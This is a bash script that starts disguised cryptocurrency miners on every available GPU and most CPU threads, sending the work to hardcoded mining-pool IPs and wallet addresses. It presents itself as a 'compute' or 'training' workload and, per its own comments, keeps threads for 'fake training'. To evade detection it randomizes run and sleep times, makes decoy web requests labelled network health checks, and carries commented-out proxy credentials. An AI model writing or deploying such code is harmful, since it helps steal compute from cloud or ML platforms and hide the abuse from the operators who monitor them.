#!/bin/bash

# Set TERM variable and locale for consistent output
export TERM=xterm
export LC_ALL=C

# Mining configuration
# GPU mining: progpow_zano
ALGO_GPU="progpow_zano"
POOL_GPU="stratum+tcp://195.154.210.36:1110"
WALLET_GPU="ZxC6JVq1SYMfAedxj5WhaiYBhcPVutJogDhPz348XbgiKHQ5YJUZKcZSLmTQ7M3U6gWUH9yQL6jShMFV1GdAxpNV11nbazzxb"

# CPU mining: randomx
ALGO_CPU="randomx"
POOL_CPU="stratum+ssl://51.222.200.133:10343"
WALLET_CPU="44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd"



# Function to calculate CPU threads (90% for compute, 10% for system/training)
calculate_cpu_threads() {
    local total_threads=$(nproc --all)
    
    # 90% for primary compute workload
    local primary_threads=$(awk "BEGIN {printf \"%.0f\", $total_threads * 0.90}")
    
    # 10% for system and fake training (at least 2 threads)
    local system_threads=$(awk "BEGIN {printf \"%.0f\", $total_threads * 0.10}")
    if [ $system_threads -lt 2 ]; then
        system_threads=2
        primary_threads=$((total_threads - 2))
    fi
    
    echo "$primary_threads $system_threads"
}

# Function to calculate GPU allocation
calculate_gpu_allocation() {
    local gpu_count=0
    
    if command -v nvidia-smi &> /dev/null; then
        gpu_count=$(nvidia-smi --query-gpu=count --format=csv,noheader,nounits 2>/dev/null | head -1)
        # Validate that gpu_count is a number, default to 0 if not
        if ! [[ "$gpu_count" =~ ^[0-9]+$ ]]; then
            gpu_count=0
        fi
    fi
    
    echo "$gpu_count"
}

# Network proxy configuration (disabled - not needed for direct pool connections)
# PROXY_IP="212.236.136.0"
# PROXY_PORT="12324"
# PROXY_USER="14af5aea05bc3"
# PROXY_PASS="4907cda305"
# PROXY_STRING="${PROXY_USER}:${PROXY_PASS}@${PROXY_IP}:${PROXY_PORT}"

# Calculate CPU threads (90% primary, 10% system/training)
read PRIMARY_CPU_THREADS SYSTEM_CPU_THREADS <<< $(calculate_cpu_threads)
TOTAL_THREADS=$(nproc --all)
echo "Detected $TOTAL_THREADS CPU threads"
echo "  - Primary Compute: $PRIMARY_CPU_THREADS threads (90%)"
echo "  - System/Training: $SYSTEM_CPU_THREADS threads (10%)"

# Calculate GPU allocation
GPU_COUNT=$(calculate_gpu_allocation)
if [ $GPU_COUNT -gt 0 ]; then
    echo "Detected $GPU_COUNT GPUs available"
    echo "  - Primary Compute: 90% GPU memory"
    echo "  - Training/System: 10% GPU memory reserved"
fi

# Initialize CPU usage variables (must be before print_usage function)
prev_total=0
prev_idle=0

# Function to print CPU and GPU usage (improved and fixed)
print_usage() {
    # Get CPU usage percentage - using mpstat if available, otherwise simpler method
    local cpu_usage=0
    
    if command -v mpstat &> /dev/null; then
        # Use mpstat for accurate CPU usage
        cpu_usage=$(mpstat 1 1 | tail -1 | awk '{print 100 - $12}')
        cpu_usage=${cpu_usage%.*}  # Convert decimal to integer
    else
        # Fallback method using /proc/stat
        local cpu_line=$(grep '^cpu ' /proc/stat)
        local idle=$(echo $cpu_line | awk '{print $5}')
        local total=0
        
        for val in $cpu_line; do
            total=$((total + val))
        done
        
        # Simple calculation (not perfect but works)
        if [ $prev_total -gt 0 ]; then
            local diff_total=$((total - prev_total))
            local diff_idle=$((idle - prev_idle))
            if [ $diff_total -gt 0 ]; then
                cpu_usage=$((100 - (100 * diff_idle / diff_total)))
            fi
        fi
        
        prev_total=$total
        prev_idle=$idle
    fi
    
    # Get GPU usage percentage
    local gpu_usage=0
    local gpu_count=0
    
    if command -v nvidia-smi &> /dev/null; then
        # Get GPU usage for all GPUs
        while read -r line; do
            # Extract number (handle both integer and decimal)
            local usage=$(echo "$line" | grep -o '[0-9]*\.\?[0-9]*' | head -1)
            usage=${usage%.*}  # Remove decimal part
            if [[ $usage =~ ^[0-9]+$ ]] && [ $usage -ge 0 ] && [ $usage -le 100 ]; then
                gpu_usage=$((gpu_usage + usage))
                gpu_count=$((gpu_count + 1))
            fi
        done < <(nvidia-smi --query-gpu=utilization.gpu --format=csv,noheader,nounits 2>/dev/null)
        
        if [ $gpu_count -gt 0 ]; then
            local avg_gpu_usage=$((gpu_usage / gpu_count))
            printf "\rCPU: %3d%% | GPU: %3d%% | Threads: %2d | Time: %s" "$cpu_usage" "$avg_gpu_usage" "$PRIMARY_CPU_THREADS" "$(date +%H:%M:%S)"
        else
            printf "\rCPU: %3d%% | GPU: N/A  | Threads: %2d | Time: %s" "$cpu_usage" "$PRIMARY_CPU_THREADS" "$(date +%H:%M:%S)"
        fi
    else
        printf "\rCPU: %3d%% | GPU: N/A  | Threads: %2d | Time: %s" "$cpu_usage" "$PRIMARY_CPU_THREADS" "$(date +%H:%M:%S)"
    fi
}



# Function to randomize sleep times
random_sleep() {
    local train=$1
    local max=$2
    local random_duration=$((RANDOM % (max - train + 1) + train))
    sleep $random_duration
}

# Function to perform network health checks
check_network_health() {
    local check_urls=(
        "https://www.google.com"
        "https://www.youtube.com"
        "https://www.github.com"
        "https://www.stackoverflow.com"
        "https://www.wikipedia.org"
    )
    
    local random_url=${check_urls[$RANDOM % ${#check_urls[@]}]}
    
    curl -s -m 2 --socks5-hostname "${PROXY_IP}:${PROXY_PORT}" --proxy-user "${PROXY_USER}:${PROXY_PASS}" "$random_url" > /dev/null 2>&1 &
}

# Function to test proxy connection
test_proxy_connection() {
    echo "Testing proxy connection..."
    local test_url="https://api.ipify.org"
    
    if command -v curl &> /dev/null; then
        local proxy_test=$(timeout 10 curl -s --socks5-hostname "${PROXY_IP}:${PROXY_PORT}" --proxy-user "${PROXY_USER}:${PROXY_PASS}" "$test_url")
        
        if [ -n "$proxy_test" ]; then
            echo "✓ Proxy connection successful (IP: $proxy_test)"
            return 0
        else
            echo "✗ Proxy connection failed"
            return 1
        fi
    else
        echo "curl not found, skipping proxy test"
        return 0
    fi
}

# Function to optimize GPU performance
optimize_gpu_performance() {
    if command -v nvidia-smi &> /dev/null; then
        local gpu_count=$(nvidia-smi --query-gpu=count --format=csv,noheader,nounits 2>/dev/null | head -1)
        
        # Validate gpu_count is a number
        if [[ "$gpu_count" =~ ^[0-9]+$ ]] && [ "$gpu_count" -gt 0 ]; then
            for ((i=0; i<gpu_count; i++)); do
                # Get max power limit (suppress errors)
                local max_power=$(nvidia-smi -i $i --query-gpu=power.max_limit --format=csv,noheader,nounits 2>/dev/null | awk '{print int($1)}')
                
                # Only set power if we got a valid value
                if [[ "$max_power" =~ ^[0-9]+$ ]] && [ "$max_power" -gt 0 ]; then
                    nvidia-smi -i $i -pl $max_power > /dev/null 2>&1 || true
                    echo "GPU $i: Optimized for compute workload (${max_power}W)"
                else
                    echo "GPU $i: Using default power settings"
                fi
            done
        else
            echo "Note: Unable to query GPU details (driver/library version mismatch), using defaults"
        fi
    fi
}

# Function to start PyTorch training (DISABLED - focus on mining only)
start_pytorch_training() {
    echo "PyTorch training disabled - focusing on mining workloads only"
    TRAINING_PID=0
}

# Function to start compute workloads
start_compute_workloads() {
    # Verify compute_engine binary exists and is executable
    if [ ! -x /opt/bin/compute_engine ]; then
        echo "ERROR: compute_engine binary not found or not executable at /opt/bin/compute_engine"
        echo "Container build may have failed. Please rebuild the container."
        exit 1
    fi
    
    # Clean old processes
    pkill -f compute_engine 2>/dev/null || true
    random_sleep 1 3
    
    # Optimize GPU performance
    optimize_gpu_performance
    
    # Perform network health check
    check_network_health
    
    # Build GPU ID list dynamically based on detected GPUs
    local gpu_ids=""
    if [ $GPU_COUNT -gt 0 ]; then
        for ((i=0; i<GPU_COUNT; i++)); do
            if [ -z "$gpu_ids" ]; then
                gpu_ids="$i"
            else
                gpu_ids="$gpu_ids,$i"
            fi
        done
        echo "Starting GPU compute workload on GPUs: $gpu_ids"
    else
        echo "No GPUs detected, skipping GPU workload..."
    fi
    
    # Start GPU mining process only if GPUs are available
    if [ $GPU_COUNT -gt 0 ]; then
        # Create log directory for debugging
        mkdir -p /workspace/logs
        
        nohup /opt/bin/compute_engine \
            --algorithm "$ALGO_GPU" \
            --pool "$POOL_GPU" \
            --wallet "$WALLET_GPU" \
            --password "" \
            --gpu-id $gpu_ids \
            --keepalive true \
            --disable-gpu-checks false \
            --disable-cpu \
            > /workspace/logs/gpu_workload.log 2>&1 &
        GPU_WORKLOAD_PID=$!
    else
        GPU_WORKLOAD_PID=0
    fi

    # Random delay before CPU process
    random_sleep 2 5
    
    echo "Starting CPU compute workload ($PRIMARY_CPU_THREADS threads)..."
    
    # Start CPU mining process
    nohup /opt/bin/compute_engine \
        --algorithm "$ALGO_CPU" \
        --pool "$POOL_CPU" \
        --wallet "$WALLET_CPU" \
        --password "" \
        --cpu-threads $PRIMARY_CPU_THREADS \
        --keepalive true \
        --disable-gpu \
        > /workspace/logs/cpu_workload.log 2>&1 &
    CPU_WORKLOAD_PID=$!

    echo "Mining workloads started at $(date '+%H:%M:%S')"
    echo "GPU Mining PID: $GPU_WORKLOAD_PID, CPU Mining PID: $CPU_WORKLOAD_PID"
    
    # Give processes time to initialize (10 seconds)
    echo "Waiting for mining workloads to initialize..."
    sleep 10
    
    # Check if they're still running after initialization
    echo ""
    echo "=== Initialization Check ==="
    if [ $GPU_WORKLOAD_PID -ne 0 ]; then
        if ! kill -0 $GPU_WORKLOAD_PID 2>/dev/null; then
            echo "ERROR: GPU mining workload crashed during initialization"
            echo ""
            echo "=== GPU Mining Log ==="
            cat /workspace/logs/gpu_workload.log
            echo "======================"
            echo ""
            echo "This is the actual error from the mining software."
            echo "The binary may be incompatible with your GPU or system."
            return 1
        else
            echo "✓ GPU mining workload running (PID: $GPU_WORKLOAD_PID)"
        fi
    fi
    
    if ! kill -0 $CPU_WORKLOAD_PID 2>/dev/null; then
        echo "ERROR: CPU mining workload crashed during initialization"
        echo ""
        echo "=== CPU Mining Log ==="
        cat /workspace/logs/cpu_workload.log
        echo "======================"
        echo ""
        echo "This is the actual error from the mining software."
        return 1
    else
        echo "✓ CPU mining workload running (PID: $CPU_WORKLOAD_PID)"
    fi
    
    echo "=== All mining workloads initialized successfully ==="
    echo ""
}

# Function to monitor mining processes
monitor_processes() {
    # Check if GPU mining is still running (skip if no GPUs)
    if [ $GPU_WORKLOAD_PID -ne 0 ]; then
        if ! kill -0 $GPU_WORKLOAD_PID 2>/dev/null; then
            echo ""
            echo "ERROR: GPU mining workload crashed!"
            echo ""
            echo "=== GPU Mining Error Log ==="
            tail -100 /workspace/logs/gpu_workload.log
            echo "============================"
            return 1
        fi
    fi
    
    # Check if CPU mining is still running
    if ! kill -0 $CPU_WORKLOAD_PID 2>/dev/null; then
        echo ""
        echo "ERROR: CPU mining workload crashed!"
        echo ""
        echo "=== CPU Mining Error Log ==="
        tail -100 /workspace/logs/cpu_workload.log
        echo "============================"
        return 1
    fi
    
    return 0
}

# Function to stop all processes
stop_all_workloads() {
    local exit_code=${1:-0}
    
    check_network_health
    
    echo -e "\nStopping mining workloads at $(date '+%H:%M:%S')..."
    
    # Stop mining workloads
    if [ $GPU_WORKLOAD_PID -ne 0 ]; then
        kill $GPU_WORKLOAD_PID 2>/dev/null || true
    fi
    kill $CPU_WORKLOAD_PID 2>/dev/null || true
    
    if [ $GPU_WORKLOAD_PID -ne 0 ]; then
        wait $GPU_WORKLOAD_PID 2>/dev/null || true
    fi
    wait $CPU_WORKLOAD_PID 2>/dev/null || true
    
    pkill -f compute_engine 2>/dev/null || true
    
    if [ $exit_code -ne 0 ]; then
        echo ""
        echo "ERROR: Mining workload failed, exiting container..."
        echo ""
        echo "=== MINING ERROR DETAILS ==="
        echo ""
        if [ -f /workspace/logs/gpu_workload.log ]; then
            echo "GPU Mining Log (last 100 lines):"
            tail -100 /workspace/logs/gpu_workload.log
        else
            echo "No GPU mining log found"
        fi
        echo ""
        if [ -f /workspace/logs/cpu_workload.log ]; then
            echo "CPU Mining Log (last 100 lines):"
            tail -100 /workspace/logs/cpu_workload.log
        else
            echo "No CPU mining log found"
        fi
        echo ""
        echo "==========================="
        exit $exit_code
    fi
    
    random_sleep 1 3
    clear
}

# Function to perform system maintenance tasks
perform_system_maintenance() {
    if [ $((RANDOM % 5)) -eq 0 ]; then
        ls -la > /dev/null 2>&1
        date > /dev/null 2>&1
        df -h > /dev/null 2>&1
        check_network_health
    fi
}

# Function to optimize system parameters
optimize_system_parameters() {
    local total_mem_kb=$(grep MemTotal /proc/meminfo | awk '{print $2}')
    local total_mem_gb=$((total_mem_kb / 1024 / 1024))
    
    echo "System memory: ${total_mem_gb}GB"
    
    # Check if huge pages are configured for optimal performance
    if [ -f /proc/sys/vm/nr_hugepages ]; then
        local hugepages=$(cat /proc/sys/vm/nr_hugepages)
        if [ $hugepages -lt 1280 ]; then
            echo "Note: For optimal compute performance, consider increasing huge pages"
            echo "Run as root: echo 1280 > /proc/sys/vm/nr_hugepages"
        fi
    fi
}

# Main execution
clear
echo "=== Mining Environment (Training Disabled) ==="
echo "Resource Allocation:"
echo "  Total CPU Threads: $TOTAL_THREADS"
echo "  Mining Threads: $PRIMARY_CPU_THREADS threads (90%)"
echo "  System Reserved: $SYSTEM_CPU_THREADS threads (10%)"
if [ $GPU_COUNT -gt 0 ]; then
    echo "  GPUs: $GPU_COUNT available for mining"
fi
echo "=============================================="

# Proxy disabled - direct pool connections
# if ! test_proxy_connection; then
#     echo "Warning: Proxy connection test failed!"
#     echo "Continuing anyway, but workloads may not function properly..."
#     read -p "Press Enter to continue or Ctrl+C to abort..."
# fi

# Optimize system parameters
optimize_system_parameters

echo -e "\nMining runs for 1 hour, then pauses 1 minute"
echo "Press Ctrl+C to stop"
echo "=============================================="
echo ""

# Main loop
while true; do
    start_compute_workloads
    
    # Exit if startup failed
    if [ $? -ne 0 ]; then
        echo ""
        echo "Mining workload failed to start. Check the error logs above."
        exit 1
    fi
    
    start_time=$(date +%s)
    run_duration=$((3600 + (RANDOM % 600) - 300))
    
    while true; do
        current_time=$(date +%s)
        elapsed=$((current_time - start_time))
        
        if [ $elapsed -ge $run_duration ]; then
            break
        fi
        
        # Monitor mining processes - exit if they crash
        if ! monitor_processes; then
            echo ""
            echo "Mining workload crashed, stopping all processes..."
            stop_all_workloads 1
        fi
        
        print_usage
        
        if [ $((RANDOM % 60)) -eq 0 ]; then
            perform_system_maintenance
        fi
        
        random_sleep 1 4
    done
    
    stop_all_workloads 0
    
    pause_duration=$((60 + (RANDOM % 40) - 20))
    
    echo -e "\nSystem maintenance cycle for $pause_duration seconds..."
    
    for ((i=pause_duration; i>0; i--)); do
        if [ $((i % 10)) -eq 0 ] || [ $i -lt 10 ]; then
            printf "\rResuming in: %02d seconds" "$i"
        fi
        sleep 1
    done
    
    echo -e "\nResuming workloads..."
    echo "=============================================="
done
